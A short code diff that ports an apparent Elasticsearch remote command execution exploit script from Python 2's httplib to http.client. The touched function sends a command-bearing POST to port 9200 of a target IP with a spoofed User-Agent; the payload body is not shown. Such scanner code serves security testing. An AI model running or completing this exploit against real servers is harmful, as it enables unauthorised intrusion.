@@ -4,7 +4,9 @@
 # __author__ = 'xfkxfk'
 
 import json
-import httplib
+
+import http.client
+
 from lib.common import save_user_script_result
 
 
@@ -27,8 +29,8 @@ def execute(ip, command):
     try:
         agent = 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.120 Safari/537.36'
         url = "http://%s:9200/_search?pretty" % ip
-        conn = httplib.HTTPConnection(ip, port=9200, timeout=10)
-        headers ={"Content-Type": "application/x-www-form-urlencoded", "User-Agent": agent}
+        conn = http.client.HTTPConnection(ip, port=9200, timeout=10)
+        headers = {"Content-Type": "application/x-www-form-urlencoded", "User-Agent": agent}
         conn.request(method='POST', url=url, body=data, headers=headers)
         resp = conn.getresponse()
         code = resp.status
